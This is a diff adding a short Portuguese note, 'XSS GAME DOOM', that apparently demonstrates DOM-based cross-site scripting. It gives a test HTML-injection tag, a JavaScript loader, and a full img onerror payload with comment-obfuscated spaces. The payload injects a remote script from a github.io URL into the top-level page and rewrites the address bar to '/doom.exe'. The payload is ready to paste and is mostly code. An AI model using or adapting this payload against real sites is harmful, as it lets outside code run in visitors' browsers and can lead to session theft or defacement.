@@ -1,0 +1,38 @@
+===========================================================
+# Brincando um pouco com JavaScript - EXPLOIT XSS GAME DOOM
+===========================================================
+
+-- Testando injeção de HTML
+
+<img src="/" =_=" title="onerror='alert(document.domain)'">
+
+===========================================================
+
+-- Vamos substituir o corpo do DOM com nosso Javascript.
+-- Veja a estrutura do código abaixo.
+-- all credit to @caiiiycuk for js-dos that was used for the game
+
+
+-- Código JavaScript
+
+var w = window.top.document;
+var x = w.createElement("script");
+x.type = "text/javascript";
+x.src = "https://mrhenrike.github.io/cursos/ish_xss_dom_based.js";
+w.getElementsByTagName("head")[0].appendChild(x);
+window.top.history.pushState("", "", "/doom.exe");
+
+
+
+-- Tag HTML
+
+<img src="/" =_=" 
+
+title="onerror='PAYLOAD'">
+
+============================================================
+-- Payload Completo abaixo
+
+<img src="/" =_="
+
+title="onerror='var/**/w=window.top.document;var/**/x=w.createElement("script");x.type="text/javascript";x.src="https://mrhenrike.github.io/cursos/ish_xss_dom_based.js";w.getElementsByTagName("head")[0].appendChild(x);window.top.history.pushState("","","/doom.exe");'">
